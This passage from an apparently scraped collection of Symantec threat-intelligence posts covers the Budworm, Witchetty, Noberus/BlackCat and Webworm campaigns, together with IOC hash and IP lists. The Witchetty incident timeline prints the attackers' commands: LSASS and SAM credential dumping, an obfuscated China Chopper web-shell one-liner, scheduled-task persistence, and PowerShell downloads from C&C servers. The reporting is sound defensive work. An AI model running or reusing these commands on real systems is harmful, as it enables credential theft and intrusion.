deb0e05adad48b90a534beabe2ef4261d2a864112945907fbd2d020b90f24507 e1af76d84f98eb4cd7af04d35030e37ffaa8120a7d048fafe0cbcb2a7f86c460 e3b82ac4870a2ae86dfe88cf7ecf9bc0dc6ed653af0ad1aaa20194cae8aff411 e4f4b3a554c8a0fd693201333e8d634f8ef1fa4ca4445ca556492bb9d0d486c4 ef24840ccde8c7547b3329c7854fdd22d2178c7ad7f931303da2e6eacbf16d1c f17278d4eaafff971864c02efdc0e4435defad96e7f5203e580a4e32c64681d8 f8ebd94779851fbeca029db4ae938457c7ccf4e010b09f025ea5394b715b1838 f90dc76a9500ee2bb3380d5f4589289ec7ffa647be4262ee7674d37ce02283b7 5d868bfbfc767515c35ced7b0da36f41ed4728914ba081f132a9d9c54564ebf0 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/spyder-loader-cuckoobees-hong-kong"
  },
  {
    "title": "budworm espionage us state",
    "content": "The Budworm espionage group has mounted attacks over the past six months against a number of strategically significant targets, including the government of a Middle Eastern country, a multinational electronics manufacturer, and a U.S. state legislature. The latter attack is the first time in a number of years Symantec has seen Budworm targeting a U.S-based entity. Along with the above high-value targets, the group also conducted an attack against a hospital in South East Asia. In recent attacks, Budworm leveraged the Log4j vulnerabilities (CVE-2021-44228andCVE-2021-45105) to compromise the Apache Tomcat service on servers in order to install web shells. The attackers used Virtual Private Servers (VPS) hosted on Vultr and Telstra as command-and-control (C&C) servers. Budworm’s main payload continues to be the HyperBro malware family, which is often loaded using a technique known as dynamic-link library (DLL) side-loading. This involves the attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application (having installed it themselves). The legitimate application then loads and executes the payload. In recent attacks, Budworm has used the endpoint privilege management software CyberArk Viewfinity to perform side-loading. The binary, which has the default name vf_host.exe, is usually renamed by the attackers in order to masquerade as a more innocuous file. Masqueraded names included securityhealthservice.exe, secu.exe, vfhost.exe, vxhost.exe, vx.exe, and v.exe. In some cases, the HyperBro backdoor was loaded with its own HyperBro loader (file names: peloader.exe, 12.exe). It is designed to load malicious DLLs and encrypt payloads. While HyperBro was frequently used, the attackers also used the PlugX/Korplug Trojan as a payload at times. Other tools used in recent attacks include: Budworm is known for mounting ambitious attacks against high-value targets. While there were frequent reports of Budworm targeting U.S. organizations six to eight years ago, in more recent years the group’s activity appears to have been largely focused on Asia, the Middle East, and Europe. However this is the second time in recent months, Budworm has been linked to attacks against a U.S-based target.A recent CISA reporton multiple APT groups attacking a defense sector organization mentioned Budworm’s toolset. A resumption of attacks against U.S.-based targets could signal a change in focus for the group. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 5aecbb6c073b0cf1ad1c6803fa1bfaa6eca2ec4311e165f25d5f7f0b3fe001db — Credential Dumper 779ae012ede492b321fd86df70f7c9da94251440ebe5ec3efee84a432f432478 — FSCAN ab949af896b6a6d986aed6096c36c4f323f650ccccfc7ea49004ba919d1bfa46 — HyperBro launcher bebce37572ea2856663383215a013f8115c1f81da0f2bf1233c959955c494032 — HyperBro launcher 6e493ce8dccabf172d818453cc9d4e5bf4b1969ff9690c51b8cb538346e8e00e — HyperBro launcher 8b2e7924f5038473736705b5c3dc3efa918fb7ffe2cc19ce48e4554658d33fe6 — HyperBro launcher cda8f76ce72759324e11c8af17736d685ca95954c0a09a682834b92a033bb11a — HyperBro launcher 25da610be6acecfd71bbe3a4e88c09f31ad07bdd252eb30feeef9debd9667c51 — HyperBro launcher 90eb92db757dc1ab4ca55b18b604350ecd84b7cd1d9a2555d789432f8c9a430b — HyperBro launcher 6398876f73cd0157a7681de4b2326a0a313dc7f9cb2bee3001894137da41c1f0 — HyperBro launcher c53b6a2ec48647121a3e8816636b34ee2cdd6846d6d05efd9539d17a1c021da0 — HyperBro launcher c3213937c194246d29dd5fb39d8e7ef3671df58e3f01353784a06a075f21cfc5 — HyperBro launcher 386c9079d65bdd7e3f7b8872024a80992b5d5c6a3c8b971c47d1ef439b9e2671 — HyperBro loader bfffc43d948d1787622bcde524e51c932a2a1fdc761539f60e777e21ef16e83d — HyperBro loader 018d3a957aa0eaa7a621b52d15f4a1ed18b0f81c477e6023cd80313d83f7dbc0 — HyperBro loader d4776939dcf78f5f7491b9938480423956ac10a3c576028dec307511c586a124 — HyperBro loader 27c2a9608ce80a443c87a0a2947864df7d4491cfa85608c6a6b6680ec0277f9d — HyperBro loader 42b603fffd4766fa22f6e10884e7fa43f449d515cfa20a18f0d07a6d4c370962 — IOX 0d46907320ab55d98966389f41441aa0341a7db829cd166748d8929d466c9fba — IOX 714d0101039bfd7d3db4dfe8307bc1657b7266ff2528b5e852b752879ebe7113 — IOX 0129c9c7b55a6f514a9fa8c38ce59d8939efda6ece67b90c6be13aec40f1bdab — Viewfinity side-load df847abbfac55fb23715cde02ab52cbe59f14076f9e4bd15edbe28dcecb2a348  — Viewfinity side-load 620e401b2b7727a6c7ebc37ee1f7d8e1742d7121c1f4ea350a43d460ef9bdc4c — Viewfinity side-load c8aea84abb476ab536198a36df53b37be3d987a9ce58cb06e93cac7d2bfb3703  — Viewfinity side-load 233bb85dbeba69231533408501697695a66b7790e751925231d64bddf80bbf91 — Cobalt Strike d610547c718fcca7c5c7e02c6821e9909333daf6376a1096edf21f9355754f29  — FRP 5c2d05bfc9b6d4fc7aea32312c62180564fac9f65b0867e824d81051e5fc34fd  — Korplug ed2f501408a7a6e1a854c29c4b0bc5648a6aa8612432df829008931b3e34bf56 — Lazagne 61deb3a206cc203252418b431f6556e3f7efd9556fc685eeda7281d9baf89851 — Lazagne 892663bb4f3080c3f2f1915734897cab1c9ee955a77bb8541b417ec2b03cd4ef — Lazagne 3d7dc77ded4022a92a32db9e10dbc67fbcc80854a281c3cc0f00b6cbd2bfd112  — Trojan Horse 48e81b1c5cc0005cc58b99cefe1b6087c841e952bb06db5a5a6441e92e40bed6 — Trojan.Dropper 5cba27d29c89caf0c8a8d28b42a8f977f86c92c803d1e2c7386d60c0d8641285 — Trojan.Dropper 139.180.146[.]101 — C&C VPS 45.77.46[.]54 — C&C VPS 139.168.200[.].123 — C&C VPS 207.148.76[.]235 — C&C VPS setting.101888gg[.]com/jquery-3.3.1.min.js — C&C 207.148.76[.]235/jquery-3.3.1.min.js — C&C The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/budworm-espionage-us-state"
  },
  {
    "title": "witchetty steganography espionage",
    "content": "The Witchetty espionage group (aka LookingFrog) has been progressively updating its toolset, using new malware in attacks on targets in the Middle East and Africa. Among the new tools being used by the group is a backdoor Trojan (Backdoor.Stegmap) that employs steganography, a rarely seen technique where malicious code is hidden within an image. In attacks between February and September 2022, Witchetty targeted the governments of two Middle Eastern countries and the stock exchange of an African nation. The attackers exploited the ProxyShell (CVE-2021-34473,CVE-2021-34523, andCVE-2021-31207) and ProxyLogon (CVE-2021-26855andCVE-2021-27065) vulnerabilities to install web shells on public-facing servers before stealing credentials, moving laterally across networks, and installing malware on other computers. Witchetty was first documented by ESET in April 2022, who concluded that it was one of three sub-groups of TA410, a broad cyber-espionage operation with some links to the Cicada group (aka APT10). Witchetty’s activity was characterized by the use of two pieces of malware, a first-stage backdoor known as X4 and a second-stage payload known as LookBack. ESET reported that the group had targeted governments, diplomatic missions, charities, and industrial/manufacturing organizations. While the group has continued to use the LookBack backdoor, several new pieces of malware appear to have been added to its toolset. One is Backdoor.Stegmap, which leverages steganography to extract its payload from a bitmap image. Although rarely used by attackers, if successfully executed, steganography can be leveraged to disguise malicious code in seemingly innocuous-looking image files. A DLL loader downloads a bitmap file from a GitHub repository. The file appears to be simply an old Microsoft Windows logo. However, the payload is hidden within the file and is decrypted with an XOR key. Disguising the payload in this fashion allowed the attackers to host it on a free, trusted service. Downloads from trusted hosts such as GitHub are far less likely to raise red flags than downloads from an attacker-controlled command-and-control (C&C) server. The payload is a fully featured backdoor capable of executing the following commands: Other new tools used by the attackers include: In one attack against a government agency in the Middle East, the first sign of malicious activity occurred on February 27, 2022 when the attackers exploited the ProxyShell vulnerability to dump the memory of the Local Security Authority Subsystem Service (LSASS) process using the comsvcs.dll file. rundll32.exe CSIDL_SYSTEM\\comsvcs.dll, MiniDump 1036CSIDL_PROFILE\\public\\dm.db full The next day, the attackers tried to dump the LSASS process using PowerShell on a different Exchange Server. powershell -exec bypass $p=Get-Process lsass;$f=New-ObjectIO.FileStream('CSIDL_COMMON_MUSIC\\d',[IO.FileMode]::Create);((([PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')).GetNestedType('NativeMethods','NonPublic')).GetMethod('MiniDumpWriteDump',([Reflection.BindingFlags]'NonPublic,Static'))).Invoke($null,@($p.Handle,$p.Id,$f.SafeFileHandle,([UInt32]2),[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$f.Close() On March 2, the attackers launched a PowerShell command to obtain a list of Windows Server machines in the victim environment. cmd.exe\" /c powershell -exec bypass Get-ADComputer -Filter{(OperatingSystem -like \"*windows*server*\") -and (Enabled -eq \"True\")}-Properties OperatingSystem | Sort Name [REDACTED] select -Unique OperatingSystem\" Malicious activity ceased until March 18 when the attackers returned to the server and used a custom tool that resembled Mimikatz (file name: dd.exe). dd.exe -domain:[REDACTED] -dc:MODDC1.[REDACTED] -user:[REDACTED] -ntlm:[REDACTED] -pwdump -all Malicious activity again ceased for some time. On April 26 and 27, the attackers ran commands to find the process identifier (PID) of the LSASS process and attempted to dump it with the technique previously seen. cmd /c tasklist | findstr lsass.exe >> CSIDL_WINDOWS\\temp\\8b7db7a3-5376-4d32-8be1-0d3092117022-microsoft.tmp rundll32 CSIDL_SYSTEM\\comsvcs.dll,minidump 1036 CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\\temp.rar full Next, on April 29, the attackers dumped the Security Account Manager (SAM) Registry Hive using the Windows reg.exe tool. reg save hklm\\sam CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\\sam.hive Between May 7 and May 9, the attackers checked the PowerShell Execution Policy and then ran the LookBack backdoor and registered it as a scheduled task on the server. powershell Get-ExecutionPolicy rundll32 CSIDL_WINDOWS\\immersivecontrolpanel\\ieupdate.dll, curl_share_init schtasks /create /tn \"InternetExplorerTaskMachineCore\" /sc daily /st 05:30 /tr \"CSIDL_WINDOWS\\immersivecontrolpanel\\ieupdate.dll\" /ru \"System\" /rl highest schtasks /run /tn \"InternetExplorerTaskMachineCore\" Between June 14 and 18, the attackers used Mimikatz to dump passwords from the LSASS memory. They then saved the SAM to a remote location, before launching a PowerShell file named “a.ps1”, creating a new mailbox, and using the command “makecab” to compress some files, likely for exfiltration. CSIDL_SYSTEM\\rundll32.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" reg save HKLM\\SAM s.dat reg save HKLM\\SAM \\\\[REDACTED]\\C$\\ProgramData\\Microsoft\\Diagnosis\\s.dat powershell -PSConsoleFile \"CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\exchange server\\v15\\bin\\exshell.psc1\" -file a.ps1 powershell -PSConsoleFile \"CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\exchange server\\v15\\bin\\exshell.psc1\" -c \"New-Mailbox -Name [REDACTED]-UserPrincipalName [REDACTED]  -Password [REDACTED] -String [REDACTED] -AsPlainText -Force)\" makecab \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\domu.csv \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\domu.cab On July 3, the attackers created a scheduled task on a remote computer to run the whoami command and save the output to a file. They then configured WinRM to allow connections from any computer. schtasks /create /s [REDACTED] /u: [REDACTED] /p [REDACTED]/tn \"BACKUPSEC\" /sc onstart /tr cmd.exe /c whoami > c:\\windows\\temp\\1.txt /ru system /f cscript //nologo CSIDL_SYSTEM\\winrm.vbs quickconfig -q cscript //nologo CSIDL_SYSTEM\\winrm.vbs s winrm/config/Client @{TrustedHosts=\"*\"} Between July 18 and 26, the attackers used the makecab command again to compress files on a remote server. They then used the ProxyLogon exploit to install the China Chopper web shell on this server. makecab \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\Server\\0718.ldf \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\Server\\0718.cab cmd /c cd /d \"CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\" & echo<%@ Page Language=\" Jscript\"%><%\\u0065\\u0076\\u0061\\u006c(\\u0052\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.Item[\"\\u0043\\u0030\\u0030\\u004b\\u0049\\u0045\"],\"\\u0075\\u006e\\u0073\\u0061\\u0066\\u0065\");%> >> \"CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\exchange server\\v15\\frontend\\httpproxy\\owa\\auth\\15.1.1979\\scripts\\premium\\flogoff.aspx\" Between July 20 and 26, the threat actors moved laterally in the network using WMIC and known credentials to try to download files from their C&C servers. wmic /node:[REDACTED] /user:[REDACTED]  /password:[REDACTED]  process call create powershell -exec bypass (new-object net.webclient).downloadstring('http://194.180.174.254/111') On July 21, the attackers ran their custom network scanning tool to discover more computers on the network and check for the open ports on those machines. p.exe -l [IP_LIST] -p [PORT_LIST] -t 5 On July 28, the attackers again registered a scheduled task on a remote computer to execute the LookBack backdoor daily as the system user. cmd /c cd /d \"CSIDL_WINDOWS\\temp\\temp\" & schtasks /create /s [REDACTED] /u [REDACTED] /p [REDACTED] /tn \"SystemControlModel\" /sc DAILY /st 4:40 /tr \"cmd.exe \\c rundll32 \\\" CSIDL_SYSTEM_DRIVE\\program Files (x86)\\Internet Explorer\\SystemControlModel.dll\\\" curl_share_init\" /ru system /f On August 1, the backdoor executed on the infected computer. rundll32 CSIDL_PROGRAM_FILES\\internet explorer\\systemcontrolmodel.dll, curl_share_init On August 7, a PowerShell script executed, which, based on the name, seems to output the last login accounts on the server. CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell_ise.exe \"CSIDL_SYSTEM_DRIVE\\report\\getlastloginou.ps1\" The last sign of malicious activity occurred on September 1, when the attackers downloaded remote files, decompressed a ZIP file with a deployment tool, executed remote PowerShell scripts, and executed the custom proxy tool to contact the C&C servers. powershell -exec bypass (new-object net.webclient).downloadstring('http://185.225.19.55:8080/111') 7.exe e deployer.7z \\\\[REDACTED]\\C$\\windows\\temp\\ wmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create cmd /c powershell -exec bypass (new-object net.webclient).downloadstring('http://185.225.19.55/111.txt') repro.exe 185.225.19.55 80 Witchetty has demonstrated the ability to continually refine and refresh its toolset in order to compromise targets of interest. Exploitation of vulnerabilities on public-facing servers provides it with a route into organizations, while custom tools paired with adept use of living-off-the-land tactics allow it to maintain a long-term, persistent presence in targeted organizations. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 619b64c6728f9ec27bba7912528a4101a9c835a547db6596fa095b3fe628e128       LookBack backdoor e597aae95dcaccc5677f78d38cd455fa06b74d271fef44bd514e7413772b5dcb         LookBack backdoor ce3293002a9681736a049301ca5ed6d696d0d46257576929efbb638545ecb78e    LookBack backdoor 73bf59c7f6a28c092a21bf1256db04919084aca5924bbd74277f8bda6191b584        LookBack backdoor acc52983d5f6b86bec6a81bc3fbe5c195b469def733f7677d681f0e405a1049b         LookBack backdoor f91e44ff423908b6acf8878dced05dc7188ddab39d1040e0d736f96f0a43518d         LookBack backdoor e7fcc98005cff9f406a5806222612c20dae3e47c469ff6028310847a599d1a38           LookBack backdoor 104873d692af36173cb39f8b46f2080c8ce1a1a52d60c69e1034e2033ba95f7a         Possible LookBack dropper 3b715112ac93e4cd5eaa7760b5670760fd25d0fec68f6a493624fa23c1c6e042         Backdoor.Stegmap 8030d3472eac3c703ae918600a78a6a89800b157d76f333734ed1af5101d04ed     Custom proxy tool 17e60fc72b5398060138f72b3ecb3b09c37243e3b2905df94b7f5b44d6157806       Custom proxy tool 97ccac64927da6f46b3a775d2feb10c271b676e6b124e5bf84e9722c9dc4f093         Custom port scanner 2d5daaae2fe2e7cd6c47ab4c5f824f670969d3fe88bfd3e4512967378c61924d         Custom persistence tool d8326470d5631e58409401fbadfc8157ee247c32b368fb4be70c2b8f8f88427e        Keylogger a6cf19ab0dc0f0fb9ed4e6da13925a80d92c326a59131991eaf207d92bc61e13        LSASS credential stealer 348d897e952c0f5872c35ea1b15eab802791b865d3c6ad3a27693680a28056cd     Korplug/PlugX loader 1c5ad98a27551e6da3502cdc9ecb232f0d1a343b002c1760f350298fee8df202        Plink dc13f67a5c52488709056f51a63f3fa1056db71616f83cbb5f1f1949395248be          SecretsDump 16bef09e16119f1754a6b4283e93ff7a17cfdd7c043c3ff05a3d41f128ead52e            FSCAN d4e2106f9d5294c04ccc02d59882785d548caf4904c8c00446d906bbec2629b2       RAR compressor 31443b7329b1bdbcf0564e68406beabf2a30168fdcb7042bca8fb2998e3f11c5         Mimikatz c4e9267138cc030e9e87c15c7ff3a15f0a7ece3c39872f354e74842e871e8dc1          Unknown malware 87e507f8fa0f881744afa3a4d5790297bb942230a08134becc150fff511f295b            Unknown malware 59e3bbf97bc08814c56f9aeebaf890a168551d3d9f2ac3efdc8247ecc1732f73         Unknown file 1242d1372ab50a48ad9acec06b4f2a154b072dc494fa392e6647e736135fa636       Corrupted File f3ae5c2ee98257d0b53d90b62eee18427918af41cb44f8097aa7c3f257c8f7ae         7-Zip file 0b29be26d5caae7cf46eaf9345eea7d9fd7e808b3334e2a2043232d450a648ee      7-Zip file e27a24e4e99e623566d8a43eb7e562d27c28a7c746d533d36f56312e9a317c2b   7-Zip file 681c22f79e5ec794858172378ed0285ef4da87f4f2dc8545bf304ce1f936529c           China Chopper baa5c96ec2c51b601a6808428dbe0dc5e274e2ac65c38c465c5a74a2deb962c6       China Chopper 74b1c46bfda5d2be5c674a6c53c2ad8f4f8d5c5b1cc010f17c6c538e117e013f           China Chopper 5972621204b6503773bfaa58b6aadae073d94c781d89e49557e4d9ecfe4049ab      China Chopper 59bfccc3a6f8e4f737c7b483ec13ba36e53f12af658529a9dd8b0df2b235c0de           China Chopper d0992dce0769d6ac23076635c902b56daeda17bab5c30f764991c0844141f61f       China Chopper 3859784f390174acc2eeabc82649f7e13f5db592978192b9243c38c254b7e614        China Chopper 1b9e723c70f0a682d4f3a5a7d98a89697b8509a07c8986de041b05806c04d1f9       China Chopper ee5f18e7dcb251a09da9650ac15723b0607282e5befc829d599005a322ac239d      China Chopper 78718feee5ee5683827e5068d73922c8cd2cf297fb1818fb2440babb8d589609       China Chopper e5f98a1b0d37a09260db033aa09d6829dc4788567beccda9b8fef7e6e3764848       Web shell 469ebdd2f6ecdce9558f3e546ef2814c5e1ad274dcd23bf4613964a0c685d889        Batch script 45549618493cf78facbfedba54e662408b7ebaabe3352119974b6500d11edc85       Batch script d273b4710800ede37617c3b6e3d58e67e45e6b54556dde468d18e48e006a79f2    Script d66a019a3cec95b6292215cf6fce4c0837f4b1de3c8af232d11ea291c87db698          Script 57e729442e8d6a06857f71538c0c11a5a49ff5d6136c05f20f391ae9eb95c2da          Script a7baecdbbf55825db281a417a9e11cd8d7b8c3ab5679d2474352091b431c6900     Script 1b75fe197f71809dea790f9d1357c0bb5e396f42dfcd4f966c64f5f71b39a865           Script de5206a50a0ef8c7f00955ffc2f5034c9d588f8736819387be9f2572666aaa4b           Script 084d4a46bb5b6a1ff7dfc2dd7be6f2023d608f5883e345a67fb98ed22188f1bd         Script 5.252.176[.]3                      LookBack C&C server a.bigbluedc[.]com           LookBack C&C server 185.225.19[.]55                 Remote IP (Malware) 153.92.1[.]125                    Remote IP (Malware) 194.180.174[.]254             Remote IP (Malware) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/witchetty-steganography-espionage"
  },
  {
    "title": "noberus blackcat ransomware ttps",
    "content": "Attackers deploying the Noberus (aka BlackCat, ALPHV) ransomware have been using new tactics, tools, and procedures (TTPs) in recent months, making the threat more dangerous than ever. Among some of the more notable developments has been the use of a new version of the Exmatter data exfiltration tool, and the use of Eamfo, information-stealing malware that is designed to steal credentials stored by Veeam backup software. Noberus is widely believed to be a successor payload to the Darkside and BlackMatter ransomware families, which were developed by a group Symantec, byBroadcom Software, tracks as Coreid (aka FIN7, Carbon Spider). Darkside was used in theColonial Pipeline ransomware attack in May 2021. The extreme amount of public and law enforcement attention that attack attracted led Coreid to shut down Darkside and replace it with BlackMatter. Coreid runs a ransomware-as-a-service (RaaS) operation, which means it develops the ransomware but it is deployed by affiliates for a cut of the profits. The ransomware being deployed by different affiliates can sometimes explain the different TTPs and attack chains used in Noberus attacks. Noberus sparked interestwhen it was first seen in November 2021because it was coded in Rust, and this was the first time we had seen a professional ransomware strain used in real-world attacks coded in that programming language. Rust is a notable language as it is cross-platform. Coreid claims that Noberus is capable of encrypting files on Windows, EXSI, Debian, ReadyNAS, and Synology operating systems. Noberus emerged shortly after BlackMatter announced it was being retired. Coreid sets out in the rules of its affiliate program that Noberus cannot be used to attack: When announcing Noberus, Coreid underlined the features that appeared designed to emphasize its superiority to rival ransomware, including that each advert is provided with an entrance through its own unique onion domain; the affiliate program architecturally excludes all possible connections with forums; even if a full-fledged command line shell is obtained, the attacker will not be able to reveal the real IP address of the server, and encrypted negotiation chats that can only be accessed by the intended victim. The ransomware also offered two encryption algorithms (ChaCha20 and AES), as well as four encryption modes - Full, Fast, DotPattern and SmartPattern. Full is the most secure but also the slowest mode. SmartPattern offers encryption of “N” megabytes in percentage increments. By default, it encrypts with a strip of 10 megabytes every 10 percent of the file starting from the header, which would be an optimal mode for attackers in terms of speed and cryptographic strength.Sentinel Labs recently published a report where it referred to this kind of encryption as “intermittent encryption” and mentioned how it had been adopted by certain ransomware operators, including Noberus, Black Basta, and more. The percentage of each ransom that is paid to Noberus affiliates varies depending on the ransom amount. Coreid has continuously updated Noberus since its launch in November 2021 to make its operation more efficient. They will also cull affiliates if they are not bringing in enough money, encouraging them to “contact less professional teams”. In December 2021, the ransomware added a new “Plus” role for affiliates that had brought in more than $1.5 million. It gave access to: Coreid made a major update to Noberus in June 2022, which included: Coreid also made some updates to the locker, by adding new restart logic, and simplifying the Linux encryption process. In a July 2022 update the team added indexing of stolen data - meaning its data leaks websites can be searched by keyword, file type, and more. The continuous updating and refining of Noberus’ operations shows that Coreid is constantly adapting its ransomware operation to ensure it remains as effective as possible. The FBIissued a warning in April 2022 saying that between November 2021 and March 2022 at least 60 organizations worldwide had been compromisedwith the Noberus ransomware - the number of victims now is likely to be many multiples of that. In August 2022, a heavily updated version of the Exmatter (Trojan.Exmatter) data exfiltration tool was observed being used alongside Noberus in ransomware attacks. Exmatterwas discovered by Symantec researchers in November 2021 being used alongside the Blackmatter ransomware. It was designed to steal specific file types from a number of selected directories and upload them to an attacker-controlled server prior to deployment of the ransomware itself on the victim’s network. Even at the time of its discovery, various variants of the tool were seen, as its developers continued to refine it to optimize its operation and expedite exfiltration of a sufficient volume of high-value data in as short a time as possible. This latest version of Exmatter has reduced the number of file types it attempts to exfiltrate. It will now exfiltrate files with the following extensions only: Other new features include: In addition to this, the malware was extensively rewritten, and even existing features were implemented differently. This was possibly a bid to avoid detection. Whether Exmatter is the creation of Coreid or a skilled affiliate of the group is not clear, but its use alongside two different iterations of Coreid’s ransomware is notable. Its continuous development also underlines the focus of the group on data theft and extortion, and the importance of this element of attacks to ransomware actors now. At least one affiliate of the Noberus ransomware operation was spotted in late August using information-stealing malware that is designed to steal credentials stored by Veeam backup software. Veeam is capable of storing credentials for a wide range of systems, including domain controllers and cloud services. The credentials are stored to facilitate the backup of these systems. The malware (Infostealer.Eamfo) is designed to connect to the SQL database where Veeam stores credentials, and it steal credentials with the following SQL query: Eamfo will then decrypt and display the credentials. Eamfo appears to have been in existence since at least August 2021 and there is evidence that it has previously been used by attackers using the Yanluowang and LockBit ransomware families. A recent report fromBlackBerry also detailed Eamfo being used alongside a new ransomware strain it dubbed Monti, which appears to be based on the leaked source code of the Conti ransomware. The TTPs used in Monti attacks also closely resemble former Conti attack chains, suggesting those behind Monti may be former affiliates of that group. Conti was developed by a group Symantec tracks as Miner. Stealing credentials from Veeamis a known attack techniquethat can facilitate privilege escalation and lateral movement, providing the attackers with access to more data they can potentially exfiltrate and more machines to encrypt. Noberus attacks involving Eamfo seen by Symantec also utilized GMER, a relatively old rootkit scanner that can be leveraged by ransomware actors to kill processes. GMER usage by ransomware attackers appears to have become more frequent in recent months, and it was also seen in the Monti attack detailed by BlackBerry. There’s no doubt that Coreid is one of the most dangerous and active ransomware developers operating at the moment. The group has been around since 2012, and became well-known for using its Carbanak malware to steal money from organizations worldwide, with the banking, hospitality and retail sectors among its preferred targets. Three members of the group were arrested in 2018, and in 2020 the group changed its tactics and launched its ransomware-as-a-service operation. Its continuous development of its ransomware and its affiliate programs indicates that this sophisticated and well-resourced attacker has little intention of going anywhere anytime soon. For the latest protection updates, please visit theSymantec Protection Bulletin. ad5002c8a4621efbd354d58a71427c157e4b2805cb86f434d724fc77068f1c40 – Trojan.Exmatter 8c5b108eab6a397bed4c099f13eed52aeeec37cc214423bde07544b44a62e74a – Ransom.Noberus 78517fb07ee5292da627c234b26b555413a459f8d7a9641e4a9fcc1099f06a3d –Infostealer.Eamfo 9aa1f37517458d635eae4f9b43cb4770880ea0ee171e7e4ad155bbdee0cbe732 –Infostealer.Eamfo df492b4cc7f644ad3e795155926d1fc8ece7327c0c5c8ea45561f24f5110ce54 –Infostealer.Eamfo 029dde7c2ec880fb3d3e95e6a8376739b4bc46a0ce24012e064b904e6ecb672c –Ransom.Noberus 72f0981f18b969db2781e874d249d8003c07f99786e217f84cf54a148de259cc –Ransom.Noberus 18c909a2b8c5e16821d6ef908f56881aa0ecceeaccb5fa1e54995935fcfd12f7 – GMER Driver e8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173 – GMER ed6275195cf9fd758fb7f8bce868c14dc9e9d6b7aa6f472f714bce5ed7fabf7f – Masqueraded PAExec 5799d554307906e92749a0c45f21baff28d83b1cedccbf7cb6f2b98ac1b00930 – Masqueraded PAExec The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/noberus-blackcat-ransomware-ttps"
  },
  {
    "title": "webworm espionage rats",
    "content": "Symantec, byBroadcom Software, has gained insight into the current activities of a group we call Webworm. The group has developed customized versions of three older remote access Trojans (RATs), including Trochilus, Gh0st RAT, and 9002 RAT. At least one of the indicators of compromise (IOCs) observed by Symantec was used in an attack against an IT service provider operating in multiple Asian countries, while others appear to be in pre-deployment or testing stages. Symantec’s Webworm has links to a group dubbed Space Pirates, which was previously documented in aMay 2022 report from Positive Technologies. It is likely that the two groups are one and the same. Active since at least 2017, Webworm has been known to target government agencies and enterprises involved in IT services, aerospace, and electric power industries located in Russia, Georgia, Mongolia, and a number of other Asian countries. Previous research on the group’s activity found that it uses custom loaders hidden behind decoy documents and modified backdoors that have been around for quite some time. This corresponds with recent Webworm activity observed by Symantec. Malware used by Webworm includes versions of the following threats: First spotted back in 2015, Trochilus is a RAT implemented in C++ and its source code is available for download on GitHub. The malware has been used in targeted threat operations by multiple groups and has features that can help it evade sandbox analysis and be useful in cyber-espionage operations. The RAT’s features include, but are not limited to, the ability to remotely uninstall a file manager, and the ability to download, upload, and execute files. Trochilus has beenpreviously linkedto malware operations from threat actors also using malware such as PlugX and a variant of the 9002 RAT. The 9002 RAT appears to have been in use since at least 2009 and has historically been used by state-sponsored actors. The malware provides attackers with extensive data exfiltration capabilities. Some variants of 9002 RAT inject into memory and do not write to the disk, something that also applies to the sample analyzed by Symantec. The malware has been used in multiple campaigns by a range of actors, including in a hacking operation targeting several large corporations located in South Korea. The RAT was used to deliver additional malware, including the PlugX RAT, onto compromised machines. It has also been involved inattacks making use of zero-day exploits. While the source code for Gh0st RAT was released online in 2008, the malware has continued to be used by advanced persistent threat (APT) groups. Gh0st RAT first made headlines back in 2009, when acyber-espionage group called GhostNetused it to target diplomatic, political, economic, and military targets around the world. Symantec observed three malware droppers developed by Webworm: Analysis of one of the droppers revealed that it drops the following files: The legitimate executable Logger.exe is used to call the “LoadLibraryA” API in order to load the malicious \"[TEMP]\\logexts.dll\" file. Thelogexts.dll file is a loader. Once run, it checks the process command-line parameters. If the command-line is the single parameter \"isdf\", it attempts to steal a token from the \"WINLOGON.EXE\" process. It then starts the following process by calling the CreateProcessAsUserW API: C:\\ProgramData\\Logger\\Logger.exe mdkv Otherwise it constructs the pathname of the second stage based on its own running executable, where it replaces the last three characters with hardcoded \"dat\" (resulting with \"Logger.dat\"). Then it reads and executes the second stage as shellcode. The second stage (\"Logger.dat\") constructs the pathname of the third stage also based on its own running executable, where it combines the directory part with hardcoded \"logexts.dat\". Finally, it reads and executes the third stage. Thelogexts.dat file is obfuscated and includes several User Account Control (UAC) bypasses. It attempts to copy the previously dropped files to the following new locations: Then the file unpacks and executes in memory its backdoor payload, a variant of the Trochilus RAT 